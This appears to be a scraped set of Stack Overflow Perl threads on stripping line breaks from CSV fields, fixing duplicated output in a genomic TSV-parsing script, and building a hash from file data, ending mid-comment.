[{"tags": ["perl", "csv", "line-breaks"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466632273, "post_id": 37978829, "comment_id": 63403671, "body": "You don&#39;t need <code>[]</code>, it&#39;s a <i>character class</i>. Since it is both you say, <code>[CR][LF]</code>, try <code>s&#47;(?:\\r\\n)+&#47;&#47;g</code>.  The parens <code>()</code> are for grouping so <code>+</code> applies to the whole thing, while <code>?:</code> is inside to make them non-capturing since you don&#39;t need to remember what was inside."}, {"owner": {"reputation": 80882, "user_id": 18157, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4d3de78b198076dd5a5006abd17cb0f8?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Garrison", "link": "https://stackoverflow.com/users/18157/jim-garrison"}, "edited": false, "score": 2, "creation_date": 1466632692, "post_id": 37978829, "comment_id": 63403816, "body": "Use a CSV Parsing module such as Text::CSV that handles embedded newlines correctly."}, {"owner": {"reputation": 80882, "user_id": 18157, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4d3de78b198076dd5a5006abd17cb0f8?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Garrison", "link": "https://stackoverflow.com/users/18157/jim-garrison"}, "edited": false, "score": 2, "creation_date": 1466632701, "post_id": 37978829, "comment_id": 63403819, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/14396605/read-csv-file-with-embedded-newlines\">Read CSV file with embedded newlines</a>"}, {"owner": {"reputation": 13, "user_id": 6500073, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55c457d148682de390bbd7119ef478a?s=128&d=identicon&r=PG&f=1", "display_name": "vincent00", "link": "https://stackoverflow.com/users/6500073/vincent00"}, "edited": false, "score": 0, "creation_date": 1466708757, "post_id": 37978829, "comment_id": 63443820, "body": "Same problem, but in that one they suggest using $row-&gt;[8] =~ s/[\\r\\n]+//g; - which is what I tried. However that did not work."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 2, "last_activity_date": 1467554479, "last_edit_date": 1467554479, "creation_date": 1466633764, "answer_id": 37979153, "question_id": 37978829, "link": "https://stackoverflow.com/questions/37978829/remove-mysterious-line-breaks-in-csv-file-using-perl/37979153#37979153", "title": "Remove mysterious line breaks in CSV file using Perl", "body": "\n\n<p>You don't give much of a sample of your CSV data, but what you show is perfectly valid. A text field may contain newlines if you wish, as long as it is enclosed in double-quotes</p>\n\n<p>The <a href=\"https://metacpan.org/pod/Text::CSV\" rel=\"nofollow\"><code>Text::CSV</code></a> module will process it quite happily as long as you enable the <code>binary</code> option in the constructor call, and you may reformat the data as you wish before you write it back out again</p>\n\n<p>This program expects the path to the input file as a parameter on the command line, and it will write the modified data to STDOUT, which you can redirect on the command line, like this</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ perl fix_csv.pl input.csv &gt; output.csv\n</code></pre>\n\n<p>I've assumed that your data contains only 7-bit ASCII data, and it should work whether you're running it on a Windows system or on Linux</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\n\nmy ($csv_file) = @ARGV;\n\nuse Text::CSV;\n\nopen my $fh, '&lt;', $csv_file or die qq{Unable to open \"$csv_file\" for input: $!};\n\nmy $csv = Text::CSV-&gt;new( { binary =&gt; 1 } );\n\nwhile ( my $row = $csv-&gt;getline( $fh ) ) {\n\n    tr/\\r\\n//d for @$row;\n\n    $csv-&gt;combine(@$row);\n    print $csv-&gt;string, \"\\n\";\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>74,,74,1,1,SJ-TL303202-DET-074-001,PDSI,\"2.25\"\" DIA. X  8.00\"\"\",A2,513,1,\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 6500073, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55c457d148682de390bbd7119ef478a?s=128&d=identicon&r=PG&f=1", "display_name": "vincent00", "link": "https://stackoverflow.com/users/6500073/vincent00"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1179, "favorite_count": 1, "accepted_answer_id": 37979153, "answer_count": 1, "score": 1, "last_activity_date": 1467554479, "creation_date": 1466632028, "last_edit_date": 1466681722, "question_id": 37978829, "link": "https://stackoverflow.com/questions/37978829/remove-mysterious-line-breaks-in-csv-file-using-perl", "title": "Remove mysterious line breaks in CSV file using Perl", "body": "<p>I have a CSV file that I'm parsing using Perl. The file is a BOM produced by Solidworks 2015 that was saved as an XLS file, then opened in Excel and saved as a CSV file.</p>\n\n<p>There are cells that have line breaks. When I read a line with such a cell from the file, the line comes in with the line breaks. For example, here is one of the lines read looks like this:</p>\n\n<pre><code>74,,74,1,1,\"SJ-TL303202-DET-074-\n001\",PDSI,\"2.25\"\" DIA. X  8.00\"\"\",A2,513,1,\n</code></pre>\n\n<p>It reads in as a single line in Perl.</p>\n\n<p>When I turn the Show All Characters in Notepad++, I can see the line breaks are cause by [CR][LF].</p>\n\n<p>So I thought this would work to remove the line feeds:</p>\n\n<pre><code>$line =~ s/[\\r\\n]+//g;\n</code></pre>\n\n<p>but it does not.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 80882, "user_id": 18157, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4d3de78b198076dd5a5006abd17cb0f8?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Garrison", "link": "https://stackoverflow.com/users/18157/jim-garrison"}, "edited": false, "score": 0, "creation_date": 1466632561, "post_id": 37978686, "comment_id": 63403772, "body": "Show the contents of <code>@tsvfiles</code> after the <code>ls</code> command.  This code seems overly complex and hard to follow for what it appears to be doing."}, {"owner": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "reply_to_user": {"reputation": 80882, "user_id": 18157, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4d3de78b198076dd5a5006abd17cb0f8?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Garrison", "link": "https://stackoverflow.com/users/18157/jim-garrison"}, "edited": false, "score": 0, "creation_date": 1466635538, "post_id": 37978686, "comment_id": 63404693, "body": "<code>ls</code> lists the path to tsv files and outputs it in a tsv_files.txt. Each file is only listed once, therefore, I don&#39;t undestand why it somehow loops through each file twice? All I&#39;m doing is listing path to files of interest, looping through each file, parsing it and dumping into FinalVariantfile.txt. I&#39;m happy to learn another way of accomplishing the same, however, I try to say away from comlex regular expressions since I&#39;m a novice."}], "answers": [{"comments": [{"owner": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466636100, "post_id": 37979411, "comment_id": 63404849, "body": "Which part is confusing? I delete $FinalVariants file each time I run the code."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466636727, "post_id": 37979411, "comment_id": 63405042, "body": "@user3781528: The main problem is that you use such a vast number of different variables and temporary files that what&#39;s actually going on is obfuscated. I&#39;ve sure it&#39;s something very simple really"}, {"owner": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466637593, "post_id": 37979411, "comment_id": 63405285, "body": "I don&#39;t think the problem is echo.  I&#39;ve tried a different method add it produced the same result. I can&#39;t test until tomorrow. Thanks for your suggestions."}, {"owner": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466696789, "post_id": 37979411, "comment_id": 63436247, "body": "I really like how concise your code is and it works great.  With few adjustments it ran great.  <code>I had to change next if $fields[70] eq &#39;0&#47;0&#39; or $fields[70] eq &#39;.&#47;.&#39;; to next if ($fields[70] =~ m|([0.])&#47;\\1|);</code> Could you please suggest how to add $sample_id as the first column of the output and also how to remove the header row from each .tsv file so that the output doesn\u2019t contain any header rows? Thanks"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466697588, "post_id": 37979411, "comment_id": 63436770, "body": "@user3781528: It works? I&#39;m astonished! I&#39;m sorry about the check on <code>$fields[70]</code>: your own comment says <i>&quot;removes lines that contain <code>0&#47;0</code> and <code>.&#47;.</code> genotypes from field 70&quot;</i>, and I assumed it should be <i>equality</i> from other, similar answers I have written. I think it should be <code>next if $fields[70] =~ m{\\.&#47;\\.|0&#47;0}</code> as the back-reference only confuses here, and I&#39;ve changed my answer. I&#39;m sorry that I forgot to add <code>$sample_id</code> to the output. I&#39;ve also made a change for that"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466697788, "post_id": 37979411, "comment_id": 63436916, "body": "@user3781528: As for removing header rows, your question <i>still</i> doesn&#39;t show any real data. I would normally say that you should open another question, but I don&#39;t think much harm is done if you just amend your question to show what we&#39;re dealing with. Please include the output of <code>ls &#47;data&#47;test_all_runs&#47;$ARGV[0]</code> as well as the contents of a couple of data files"}, {"owner": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466697914, "post_id": 37979411, "comment_id": 63436995, "body": "how do I attach files here?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466698151, "post_id": 37979411, "comment_id": 63437141, "body": "@user3781528: I hope you will absorb how there&#39;s no need for multiple intermediate files if you&#39;re using Perl? You should also drop the habit of declaring a bunch of variables at the top of your program -- that is (very old) C-style programming, and it&#39;s not appropriate in most modern languages. Variables should always be declared <i>as late as possible</i>. You should adopt <code>snake_case</code> instead of <code>CamelCase</code> wherever possible. Capital letters imply global variables, and <code>lower_case_names_remain_readable</code>, especially for people whose native language isn&#39;t English"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466698358, "post_id": 37979411, "comment_id": 63437268, "body": "@user3781528: It is best to <a href=\"http://stackoverflow.com/posts/37978686/edit\">edit your question</a> -- the link is on the left, right above the comments on your question. If you want to post more than fifty or so lines then you can use <a href=\"http://pastebin.com/\" rel=\"nofollow noreferrer\">pastebin</a> and put a link here, but it&#39;s always best to avoid out-of-band links if you can. Stack Overflow questions never die, but your references may well be deleted."}, {"owner": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466702943, "post_id": 37979411, "comment_id": 63440136, "body": "Sorry, one last related question.   It possible to edit values in columns of interest (e.g  21, 67) before I collect them in @wanted? I will post data soon. Thanks"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466704096, "post_id": 37979411, "comment_id": 63440886, "body": "@user3781528: Do you understand most of what I have written? The proper way would be to use the header names that you want to remove to identify the columns that you want to keep, as well as those that you want to change. I hope that you should be able to make a stab at that yourself. It sounds like you should save your edit for a new question"}, {"owner": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "edited": false, "score": 0, "creation_date": 1466707989, "post_id": 37979411, "comment_id": 63443340, "body": "Yes, I do understand and I like it much better what I had before but I need to understand how to edit values in each column before dumping them in the output file.  I do know how to do it the dirty way by splitting the <code>$current_line</code>, however,  I&#39;m trying to learn how to program the correct way. I\u2019m trying to learn on my own here.  I will post this question. I\u2019m very grateful for your advice."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 3, "last_activity_date": 1466678614, "last_edit_date": 1466678614, "creation_date": 1466635364, "answer_id": 37979411, "question_id": 37978686, "link": "https://stackoverflow.com/questions/37978686/duplicated-output-with-for-each-loop/37979411#37979411", "title": "Duplicated output with for each loop", "body": "\n\n<p>There is no need to start so many new shell subprocesses to do such basic operations. <code>ls</code>, <code>fgrep</code>, <code>grep</code> and <code>echo</code> all have equivalents in Perl, and especially calling <code>echo</code> for each line of text is a very poor way of copying one file to another</p>\n\n<p>I suspect that your problem is because of the line</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>my $cmd5 = `echo \"$currentguiline\" &gt;&gt; $FinalVariants`;\n</code></pre>\n\n<p>which will <em>append</em> each element of <code>@currentlines</code> to the end of the file. So the first time you run your program it will contain a single copy of the result, but every subsequent run will just add more data to the end of your file and it will keep growing</p>\n\n<p>I hate to offer a hack to get things working, but it would take me ages to understand what your program is doing behind all the confusion and write a proper concise version. You can fix it temporarily by adding the line</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>unlink $FinalVariants or die $!;\n</code></pre>\n\n<p>before the <code>foreach ( @tsvfiles ) { ... }</code> loop. This will delete the file and ensure that a new version is created for each execution of your program.</p>\n\n<p><br/></p>\n\n<hr>\n\n<p>Okay, I've studied your code carefully and I <em>think</em> this will do what you intend. Without any data or even file name samples I've been unable to test it beyond making sure that it compiles, so it will be a miracle if it works first time, but I believe it's the best chance you have of getting a coherent solution</p>\n\n<p>Note that there's a problem with <code>$refreverse</code> that you use in your own code but never declare or define it, so there's no way that the code you show will create the problem you say it does because it dies during compilation with the error message</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Global symbol \"$refreverse\" requires explicit package name\n</code></pre>\n\n<p>I've guessed that it's right after <code>$ref_forward</code> at index 68</p>\n\n<p>Please report back about how well this functions</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings 'all';\n\nmy $home          = \"/data\";\nmy $tsv_directory = \"$home/test_all_runs/$ARGV[0]\";\n\nmy $final_variants = \"$tsv_directory/final_variant_file.txt\";\n\nopen my $out_fh, '&gt;', $final_variants\n        or die qq{Unable to open \"$final_variants\" for output: $!};\n\nmy @tsv_files = glob \"$tsv_directory/FOCUS*.tsv\";\n\nfor my $tsv_file ( @tsv_files ) {\n\n    print \"The current VCF is ############# $tsv_file\\n\";\n\n    $tsv_file =~ m|([^/]+)-oncogene.tsv$| or die \"Cant extract Sample ID\";\n    my $sample_id = $1;\n    print \"The sample ID is ############## $sample_id\\n\";\n\n    open my $in_fh, '&lt;', $tsv_file\n            or die qq{Unable to open \"$tsv_file\" for input: $!};\n\n    while ( &lt;$in_fh&gt; ) {\n\n        next if /^#/;\n        next if /\\b(?:CNV|intronic|synonymous|utr_3|utr_5)\\b/;\n\n        my @fields = split;\n        next if $fields[70] eq '0/0' or $fields[70] eq './.';\n\n        my @wanted = ( 9, 10, 21, 67, 68, 70, 77, 78, 81, 83, 84, 88, 92, 98, 100 );\n        my $current_line = join \"\\t\", @fields[@wanted];\n\n        print $out_fh $current_line, \"\\n\";\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 623, "user_id": 3781528, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/57552cda53e1092efc04fb0a7d313a25?s=128&d=identicon&r=PG&f=1", "display_name": "user3781528", "link": "https://stackoverflow.com/users/3781528/user3781528"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 116, "favorite_count": 0, "accepted_answer_id": 37979411, "answer_count": 1, "score": -1, "last_activity_date": 1466678614, "creation_date": 1466631360, "last_edit_date": 1466637674, "question_id": 37978686, "link": "https://stackoverflow.com/questions/37978686/duplicated-output-with-for-each-loop", "title": "Duplicated output with for each loop", "body": "<p>My code loops through multiple files in a directory, parses each file and appends the parsed content of each file to <code>FinalVariantfile.txt</code>.</p>\n\n<p>The code works, but duplicates the content of each file.</p>\n\n<p>When I ran the code with two files the output contained 4 files. Could someone please explain why this is happening and how to fix this?  </p>\n\n<pre><code>    #!/usr/bin/perl -w\n\n    use strict;\n\n    #directory structure\n\n    my $home         = \"/data/\";\n    my $tsvdirectory = $home . \"test_all_runs/\" . $ARGV[0];\n    my $tsvfiles     = $home . \"test_all_runs/\" . $ARGV[0] . \"/tsv_files.txt\";\n\n    my $FinalVariants = $home . \"test_all_runs/\" . $ARGV[0] . \"/FinalVariantfile.txt\";\n\n    my @tsvfiles        = ();\n    my @currentlines    = ();\n    my $currentline     = '';\n    my $currentCNVline  = '';\n    my @currentCNVlines = ();\n    my @HotSpotLines    = ();\n    my @CNVLines        = ();\n\n    # command to produce the vcf_files.txt file stored in each individual run\n    # directory; the file list includes solely vcf files which have not been\n    # previously prepared and/or annotated\n    my $cmd = `ls $tsvdirectory/FOCUS*\\.tsv &gt; $tsvfiles`;\n\n    # print \"$cmd\";\n    my $cmda = \"ls $tsvdirectory/FOCUS*\\.tsv &gt; $tsvfiles\";\n\n    # print \"$cmda\";\n\n    # this code opens the vcf_files.txt file and passes each line into an array for\n    # indidivudal manipulation\n    open( TXT2, \"$tsvfiles\" );\n    while ( &lt;TXT2&gt; ) {\n        push( @tsvfiles, $_ );\n    }\n    close(TXT2);\n\n    foreach ( @tsvfiles ) {\n        chop($_);\n    }\n\n    # this code then parses each of the files listed by name in the tsvfiles array\n    foreach ( @tsvfiles ) {\n\n        my $currenttsvfile = \"$_\";    # establishes the current file being manipulated\n\n        my $MDLfinaltsvfile = $currenttsvfile;\n        $MDLfinaltsvfile =~ s/\\.tsv/_prepared\\.txt/g;\n\n        # this series of variable calls names the various intermediate or\n        # final output files\n\n        my $MDLlinestsvfile = $currenttsvfile;\n        $MDLlinestsvfile =~ s/\\.tsv/_withCNV\\.txt/g;\n\n        my $Variantlinestsvfile = $currenttsvfile;\n        $Variantlinestsvfile =~ s/\\.tsv/_HotSpot\\.txt/g;\n\n        my $MDLtsvfile = $currenttsvfile;\n        $MDLtsvfile =~ s/\\.tsv/_FilteredAllcolumns\\.txt/g;\n\n        my $MDLsampleid = $currenttsvfile;\n        $MDLsampleid =~ s/\\-oncogene.tsv//g;\n        print \"The currentVCFis############# \" . $currenttsvfile . \"\\n\";\n\n        my @SampleID = ();\n        @SampleID = split /\\//, $MDLsampleid;\n        print \"The sampleIDis##############\" . $SampleID[4] . \"\\n\";\n\n        my $CNVdata = $currenttsvfile;\n        $CNVdata =~ s/\\.tsv/_cnv\\.txt/g;\n\n        my $FinalCNVdata = $currenttsvfile;\n        $FinalCNVdata =~ s/\\.tsv/_finalcnv\\.txt/g;\n\n        my $cmd2 = `fgrep -v \"#\" $currenttsvfile &gt; $MDLlinestsvfile`;\n        print \"$cmd2\";    # this code extracts from the current vcf file all of the\n                          # lines of data and outputs them into a separate file\n\n        my $cmd5 = `grep -vwE \"(CNV|intronic|synonymous|utr_3|utr_5)\" \n#removes lines that contain CNV/intronic/synonymous/utr_3/utr_5\"\n\n$MDLlinestsvfile &gt; $Variantlinestsvfile`;\n        print \"$cmd5\";\n\n        open( my $fh_in, '&lt;', $Variantlinestsvfile )\n                or die \"cannot open $Variantlinestsvfile: $!\\n\"; \n#removes lines that contain 0/0 and ./. genotypes from field 70.\n\n        open( my $fh_out, '&gt;', $MDLtsvfile )\n                or die \"cannot open $MDLtsvfile: $!\\n\";\n\n        while ( my $line = &lt;$fh_in&gt; ) {\n\n            # tab/field-based:\n            my @fields = split( /\\s+/, $line );\n            print $fh_out $line unless ( $fields[70] =~ m|([0.])/\\1| );\n        }\n        close($fh_in);\n        close($fh_out);\n\n        #open each filtered file with all columns and pushes it into array.\n        open( TXT2, \"$MDLtsvfile\" );\n        while (&lt;TXT2&gt;) {\n            push( @HotSpotLines, $_ );\n        }\n        close(TXT2);\n\n        foreach (@HotSpotLines) {\n            chop($_);\n\n            my @HotSpotEntries = ();\n            my $currentMDLline = $_;\n            @HotSpotEntries = split( /\\t/, $currentMDLline );\n\n            my $chr        = $HotSpotEntries[9];\n            my $position   = $HotSpotEntries[10];\n            my $cosmicids  = $HotSpotEntries[21];\n            my $refforward = $HotSpotEntries[67];\n            my $genotype   = $HotSpotEntries[70];\n            my $altforward = $HotSpotEntries[77];\n            my $altreverse = $HotSpotEntries[78];\n            my $cDNA       = $HotSpotEntries[81];\n            my $exon       = $HotSpotEntries[83];\n            my $conseq     = $HotSpotEntries[84];\n            my $location   = $HotSpotEntries[88];\n            my $geneclass  = $HotSpotEntries[92];\n            my $aachange   = $HotSpotEntries[98];\n            my $transcript = $HotSpotEntries[100];\n\n            $currentline\n                    = $SampleID[4] . \"\\t\"\n                    . $chr . \"\\t\"\n                    . $position . \"\\t\"\n                    . $cosmicids . \"\\t\"\n                    . $refforward . \"\\t\"\n                    . $refreverse . \"\\t\"\n                    . $genotype . \"\\t\"\n                    . $altforward . \"\\t\"\n                    . $altreverse . \"\\t\"\n                    . $cDNA . \"\\t\"\n                    . $exon . \"\\t\"\n                    . $conseq . \"\\t\"\n                    . $location . \"\\t\"\n                    . $geneclass . \"\\t\"\n                    . $aachange . \"\\t\"\n                    . $transcript;\n\n            # print \"The currentVCFlineis \".$currentline.\"\\n\";\n            push( @currentlines, $currentline );\n\n        }\n\n        my $i;\n\n        for ( $i = 0; $i &lt; @currentlines; $i += 1 ) {\n\n            my $currentguiline = $currentlines[$i];\n\n            my $cmd5 = `echo \"$currentguiline\" &gt;&gt; $FinalVariants`;\n            print \"$cmd5\";\n\n            #my $cmd9 = `sed -i '1i$SampleID[4]' $FinalVariants`; print $cmd9;\n        }\n    }\n</code></pre>\n"}, {"tags": ["arrays", "perl", "hash"], "comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1466625443, "post_id": 37977057, "comment_id": 63400430, "body": "Drop the <code>my</code> from <code>my $key</code> and <code>my $value</code> in the <code>if&#47;elsif</code> blocks because that will create <i>new</i> variables and hide the global ones. But what&#39;s the expected outcome? <code>{1 =&gt; &#39;output###.txt&#39;, 2 =&gt; &#39;output###.txt&#39;}</code> ?"}, {"owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466626376, "post_id": 37977057, "comment_id": 63400946, "body": "@PerlDog Thanks for the feedback. Yes, the hash I would like is <code>{1 =&gt; &#39;output###.txt&#39;, 2 =&gt; &#39;output###.txt&#39;}</code> - I would just add a counter, but the numbers aren&#39;t in order in my input file."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466626679, "post_id": 37977057, "comment_id": 63401084, "body": "Ok, and how does the <code>1</code> in line 1 relate to the <code>1111</code> in line 2? Why do they match? Because the 2nd line starts with 4 times the number from line 1 or because it&#39;s <code>number + 1110</code>? Or simply because it&#39;s the next line? Please show some input that is not as ambiguous."}, {"owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466626894, "post_id": 37977057, "comment_id": 63401182, "body": "@PerlDog, I tried to simplify the input I posted in the question but here are the first few lines of the actual input                                         <code>@cluster t.10 has 4319 elements, 0 subclusters 37652 ..&#47;..&#47;..&#47;..&#47;clust&#47;output43888.txt 1.397428 </code> Basically the number in the second line is an arbitrary identifier then it&#39;s the output file (output###.txt) and last is a distance measurement."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466628608, "post_id": 37977057, "comment_id": 63402012, "body": "@EA00  Thank you for the attribution.  Please note that I&#39;ve added a comment at the end which may be helpful.  